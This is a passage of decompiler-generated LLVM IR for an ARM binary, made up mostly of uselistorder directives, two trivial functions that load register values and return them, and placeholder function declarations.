  uselistorder i32 8, { 0, 46, 1, 47, 54, 55, 56, 57, 58, 59, 60, 61, 62, 209, 2, 33, 210, 211, 48, 63, 64, 65, 66, 67, 68, 69, 70, 71, 212, 26, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 27, 72, 73, 74, 75, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 76, 77, 49, 50, 51, 52, 53, 90, 91, 92, 93, 94, 95, 96, 21, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 149, 150, 34, 229, 230, 38, 151, 138, 139, 140, 141, 152, 153, 154, 155, 156, 157, 158, 159, 3, 39, 160, 161, 162, 163, 164, 165, 166, 167, 4, 168, 169, 170, 171, 172, 5, 173, 174, 6, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 192, 185, 186, 187, 188, 40, 18, 189, 190, 191, 41, 42, 7, 193, 194, 195, 196, 198, 199, 43, 8, 200, 9, 197, 30, 31, 28, 29, 19, 20, 24, 25, 32, 231, 201, 202, 203, 204, 35, 45, 22, 10, 11, 16, 12, 44, 23, 13, 14, 17, 15, 37, 125, 116, 117, 118, 119, 120, 121, 122, 123, 124, 126, 127, 128, 129, 130, 143, 131, 132, 133, 134, 135, 146, 142, 136, 137, 144, 145, 147, 36, 148, 205, 206, 207, 208 }
  uselistorder i32 48, { 2, 1, 8, 5, 9, 11, 12, 6, 7, 13, 14, 15, 4, 10, 3, 0, 16 }
  uselistorder i32 20, { 3, 6, 15, 37, 11, 38, 39, 40, 16, 17, 41, 4, 42, 43, 1, 5, 18, 7, 12, 19, 20, 21, 22, 23, 31, 32, 13, 14, 44, 24, 25, 26, 27, 28, 29, 30, 8, 33, 2, 34, 9, 35, 36, 0, 10 }
  uselistorder i32 16, { 57, 58, 59, 9, 60, 61, 62, 63, 0, 1, 68, 69, 70, 71, 72, 73, 114, 35, 2, 3, 115, 116, 64, 74, 75, 76, 77, 36, 78, 26, 27, 28, 117, 29, 118, 119, 30, 120, 121, 122, 123, 124, 125, 126, 127, 79, 80, 81, 82, 83, 86, 87, 88, 84, 85, 65, 89, 10, 90, 91, 37, 38, 92, 93, 94, 95, 39, 105, 106, 66, 67, 128, 40, 41, 43, 44, 107, 6, 45, 108, 109, 4, 110, 111, 42, 46, 24, 112, 47, 113, 48, 49, 11, 22, 12, 13, 7, 14, 15, 16, 23, 17, 8, 18, 19, 20, 96, 50, 97, 25, 98, 99, 51, 5, 100, 101, 102, 52, 103, 31, 104, 53, 54, 21, 33, 32, 55, 34, 56 }
  uselistorder i32 9, { 13, 14, 2, 15, 10, 11, 12, 18, 1, 19, 3, 4, 9, 16, 5, 17, 6, 0, 7, 8 }
  uselistorder i32 -2, { 5, 10, 2, 3, 1, 6, 7, 8, 9, 0, 4, 11, 12, 13, 14 }
  uselistorder i32 132, { 0, 3, 4, 5, 6, 1, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1d280.213 to i32), { 2, 3, 58, 76, 77, 59, 60, 78, 4, 61, 79, 5, 6, 7, 8, 9, 27, 25, 26, 28, 29, 80, 22, 62, 81, 63, 82, 10, 11, 64, 65, 66, 83, 12, 84, 85, 86, 13, 87, 14, 67, 88, 89, 15, 16, 17, 90, 68, 91, 18, 92, 19, 93, 94, 95, 0, 21, 96, 69, 97, 71, 98, 99, 100, 20, 101, 23, 53, 49, 47, 46, 48, 50, 51, 52, 45, 54, 40, 42, 41, 39, 38, 43, 44, 35, 34, 37, 36, 33, 32, 31, 30, 73, 55, 72, 56, 57, 74, 102, 1, 103, 104, 24, 70, 105, 75 }
  uselistorder i32* @r7, {}
  uselistorder i32* @r6, { 26, 31, 32, 29, 30, 33, 304, 305, 306, 307, 308, 309, 310, 311, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 3, 48, 49, 50, 51, 52, 17, 53, 54, 55, 4, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 27, 28, 68, 69, 70, 71, 5, 72, 73, 74, 6, 75, 76, 77, 78, 79, 25, 80, 18, 7, 8, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 226, 227, 228, 229, 315, 230, 9, 231, 232, 113, 22, 114, 115, 116, 118, 117, 119, 92, 10, 93, 11, 94, 312, 313, 314, 233, 237, 238, 239, 240, 234, 235, 236, 241, 242, 243, 244, 245, 246, 247, 248, 249, 12, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 265, 267, 261, 262, 263, 264, 266, 268, 120, 121, 2, 122, 95, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 211, 212, 213, 214, 215, 135, 136, 137, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 138, 139, 140, 141, 142, 143, 0, 144, 24, 145, 146, 161, 162, 163, 147, 149, 148, 159, 160, 150, 151, 152, 153, 154, 155, 156, 157, 158, 164, 165, 283, 13, 284, 285, 286, 14, 287, 288, 289, 290, 291, 292, 293, 166, 167, 168, 96, 97, 98, 99, 102, 100, 101, 103, 104, 105, 106, 107, 108, 109, 169, 170, 183, 184, 185, 186, 187, 196, 197, 201, 202, 203, 204, 110, 1, 111, 112, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 188, 189, 15, 190, 191, 192, 193, 194, 195, 198, 199, 23, 19, 200, 205, 206, 207, 208, 209, 16, 210, 216, 217, 218, 219, 220, 20, 221, 294, 295, 296, 297, 298, 299, 300, 21, 301, 302, 303, 222, 223, 224, 225 }
  uselistorder i32* @r5, { 42, 46, 47, 45, 7, 48, 49, 50, 51, 426, 0, 427, 428, 429, 430, 431, 432, 52, 53, 54, 8, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 9, 69, 70, 71, 433, 434, 435, 72, 40, 73, 2, 74, 436, 437, 438, 439, 440, 441, 442, 443, 444, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 39, 85, 86, 87, 88, 10, 89, 90, 91, 92, 93, 11, 12, 94, 4, 95, 96, 97, 98, 99, 100, 101, 102, 43, 44, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 13, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 14, 132, 133, 134, 135, 136, 137, 15, 138, 139, 140, 141, 142, 143, 16, 17, 144, 145, 146, 147, 148, 149, 20, 150, 18, 151, 152, 153, 154, 155, 156, 19, 157, 158, 159, 160, 161, 162, 163, 21, 164, 165, 166, 167, 341, 342, 22, 450, 463, 464, 451, 456, 461, 462, 343, 344, 345, 346, 347, 168, 169, 170, 171, 172, 173, 174, 445, 446, 447, 448, 449, 23, 24, 452, 453, 454, 455, 175, 176, 177, 178, 348, 349, 353, 354, 355, 356, 357, 350, 351, 352, 358, 359, 360, 25, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 5, 376, 377, 378, 379, 380, 26, 381, 382, 383, 384, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 329, 330, 331, 332, 242, 243, 385, 386, 27, 387, 388, 389, 390, 391, 179, 180, 181, 182, 392, 28, 393, 394, 395, 396, 397, 398, 244, 245, 246, 247, 457, 458, 459, 460, 248, 249, 250, 251, 252, 265, 266, 253, 254, 29, 255, 256, 257, 258, 36, 264, 259, 260, 261, 3, 1, 262, 263, 267, 268, 269, 270, 399, 400, 401, 6, 402, 403, 404, 41, 405, 30, 406, 407, 408, 409, 410, 271, 272, 273, 274, 275, 276, 277, 284, 32, 190, 186, 183, 200, 184, 185, 187, 201, 188, 189, 191, 192, 193, 194, 195, 196, 197, 198, 199, 202, 204, 203, 205, 206, 207, 285, 33, 208, 209, 210, 211, 212, 213, 214, 215, 31, 216, 217, 290, 291, 292, 293, 294, 295, 296, 315, 316, 317, 318, 218, 219, 278, 279, 280, 281, 282, 283, 220, 221, 222, 223, 224, 286, 287, 288, 289, 297, 298, 299, 300, 301, 302, 303, 304, 34, 305, 306, 307, 35, 37, 308, 309, 310, 312, 313, 311, 38, 314, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 333, 334, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 335, 336, 337, 338, 339, 340 }
  uselistorder i32 ()* @function_d6d4, { 8, 7, 6, 1, 0, 5, 4, 3, 2 }
  uselistorder i32 1, {}
  uselistorder label %dec_label_pc_12820, { 1, 0 }
  uselistorder label %dec_label_pc_1279c, { 1, 0 }
  uselistorder label %dec_label_pc_1274c, { 1, 0 }
  uselistorder label %dec_label_pc_12730, { 2, 0, 1 }
  uselistorder label %dec_label_pc_126e8, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_128a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_128a8:
  %v0_128a8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_128a8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_128a8
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_128a8, %bb
  %v10_128b0 = phi i32 [ %arg1, %dec_label_pc_128a8 ], [ 0, %bb ]
  ret i32 %v10_128b0

; uselistorder directives
  uselistorder i1 false, { 0, 10, 11, 12, 29, 6, 9, 30, 31, 13, 14, 32, 7, 2, 1, 28, 26, 27, 15, 16, 8, 19, 18, 17, 20, 3, 5, 4, 21, 24, 25, 22, 23, 33, 34 }
  uselistorder i1* @cpsr_z, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 34, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_13b04() local_unnamed_addr {
entry:
  %v3_13b08 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_13b08)
  %v31_13b10 = load i32, i32* @r0, align 4
  ret i32 %v31_13b10

; uselistorder directives
  uselistorder i32* @r0, { 49, 221, 39, 27, 74, 75, 76, 222, 225, 226, 227, 229, 67, 34, 223, 224, 77, 53, 78, 79, 54, 46, 10, 230, 11, 26, 80, 0, 81, 12, 13, 231, 232, 233, 52, 234, 235, 236, 1, 17, 237, 238, 239, 3, 2, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 4, 255, 22, 256, 82, 37, 68, 69, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 45, 168, 25, 169, 16, 40, 18, 19, 170, 171, 257, 258, 260, 63, 64, 65, 66, 47, 172, 173, 5, 32, 70, 129, 130, 6, 41, 71, 261, 262, 7, 24, 72, 174, 175, 8, 38, 73, 15, 93, 94, 259, 95, 177, 50, 61, 62, 178, 9, 179, 180, 181, 176, 182, 183, 184, 185, 186, 187, 131, 48, 132, 133, 20, 134, 135, 35, 136, 166, 36, 167, 137, 42, 138, 139, 14, 28, 188, 189, 190, 140, 21, 141, 29, 23, 142, 31, 228, 143, 144, 147, 145, 146, 44, 191, 43, 192, 193, 30, 194, 96, 108, 107, 97, 98, 99, 100, 101, 102, 113, 103, 104, 105, 106, 109, 110, 111, 112, 114, 115, 55, 116, 117, 118, 119, 148, 149, 151, 120, 121, 122, 123, 124, 125, 126, 152, 153, 154, 155, 127, 150, 128, 156, 157, 158, 159, 160, 161, 162, 33, 56, 163, 57, 164, 165, 58, 59, 60, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 51 }
  uselistorder void (i32)* @__pseudo_branch, { 0, 1, 3, 4, 5, 61, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 2, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 62, 68, 69, 70, 71, 72, 73, 74, 63, 78, 79, 80, 81, 42, 43, 34, 35, 36, 37, 38, 39, 40, 41, 44, 64, 65, 66, 67, 75, 76, 77, 45, 46, 47, 48, 49, 50, 51, 52, 53, 82, 54, 55, 56, 57, 58, 59, 33, 60 }
  uselistorder i32 0, {}
  uselistorder i32* @r4, { 45, 46, 543, 56, 57, 58, 59, 60, 9, 61, 62, 63, 10, 64, 65, 66, 67, 68, 69, 70, 0, 11, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 544, 47, 48, 49, 546, 547, 548, 551, 5, 552, 50, 545, 87, 88, 89, 90, 91, 92, 93, 94, 95, 12, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 553, 554, 114, 115, 13, 3, 116, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 14, 117, 118, 119, 120, 121, 122, 123, 124, 125, 15, 126, 127, 128, 129, 130, 16, 131, 134, 17, 135, 136, 18, 137, 138, 19, 139, 140, 20, 141, 142, 21, 143, 42, 144, 145, 146, 22, 147, 148, 149, 150, 151, 152, 153, 132, 133, 51, 52, 53, 154, 155, 156, 157, 23, 158, 24, 25, 159, 160, 161, 162, 163, 164, 165, 166, 167, 26, 168, 169, 27, 170, 171, 28, 172, 173, 29, 174, 175, 30, 176, 177, 31, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 32, 190, 191, 192, 33, 193, 194, 195, 196, 197, 198, 39, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 422, 54, 549, 550, 423, 424, 425, 426, 427, 428, 429, 430, 567, 568, 569, 431, 432, 44, 574, 40, 575, 576, 577, 593, 595, 596, 597, 594, 578, 583, 591, 592, 570, 584, 585, 586, 587, 55, 433, 434, 6, 34, 435, 35, 436, 437, 438, 579, 580, 269, 270, 271, 209, 210, 211, 212, 213, 214, 571, 572, 573, 581, 582, 215, 216, 217, 218, 439, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 36, 456, 457, 458, 459, 440, 441, 442, 443, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 43, 478, 479, 1, 480, 481, 482, 483, 484, 485, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 286, 287, 288, 284, 285, 289, 290, 291, 292, 293, 294, 295, 296, 297, 401, 402, 403, 404, 405, 406, 407, 298, 299, 300, 301, 302, 303, 486, 487, 488, 489, 490, 491, 492, 219, 220, 221, 493, 494, 495, 496, 8, 497, 498, 499, 500, 501, 502, 503, 304, 305, 306, 309, 310, 311, 307, 308, 588, 589, 590, 312, 313, 314, 332, 333, 334, 335, 336, 337, 315, 316, 317, 318, 319, 320, 321, 322, 330, 331, 323, 324, 325, 4, 2, 326, 327, 41, 328, 329, 338, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 339, 340, 341, 342, 343, 344, 345, 346, 236, 237, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 238, 239, 240, 241, 242, 243, 245, 244, 246, 247, 248, 249, 250, 251, 37, 252, 253, 254, 255, 256, 257, 258, 356, 357, 358, 359, 364, 365, 366, 367, 368, 380, 381, 382, 387, 388, 389, 38, 390, 7, 391, 259, 260, 261, 262, 263, 347, 348, 349, 350, 351, 352, 353, 354, 355, 264, 265, 266, 267, 268, 360, 361, 362, 363, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 383, 384, 385, 386, 392, 393, 394, 395, 396, 397, 398, 399, 400, 408, 409, 410, 411, 412, 521, 522, 523, 524, 525, 526, 527, 528, 531, 532, 533, 534, 535, 536, 539, 540, 413, 414, 415, 416, 417, 418, 419, 420, 421, 529, 530, 537, 538, 541, 542 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8* @__decompiler_undefined_function_3() local_unnamed_addr

declare i16* @__decompiler_undefined_function_4() local_unnamed_addr

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #0

declare float @fabsf(float)

attributes #0 = { noreturn nounwind }
